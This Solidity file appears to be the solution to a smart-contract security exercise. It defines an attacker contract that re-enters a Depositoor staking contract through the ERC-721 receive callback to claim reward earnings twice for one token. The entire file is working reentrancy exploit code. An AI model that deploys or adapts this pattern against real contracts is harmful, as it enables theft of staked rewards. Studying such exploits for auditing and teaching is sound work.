//SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "./RewardToken.sol";

contract RewardTokenAttacker is IERC721Receiver {
    function deposit(NftToStake nft, address dep, uint256 tokenId) external {
        nft.safeTransferFrom(address(this), dep, tokenId);
    }

    function attack(Depositoor dep, uint256 tokenId) external {
        dep.withdrawAndClaimEarnings(tokenId);
    }

    function onERC721Received(address, address from, uint256 tokenId, bytes calldata)
        external
        override
        returns (bytes4)
    {
        Depositoor(from).claimEarnings(tokenId);
        return IERC721Receiver.onERC721Received.selector;
    }
}
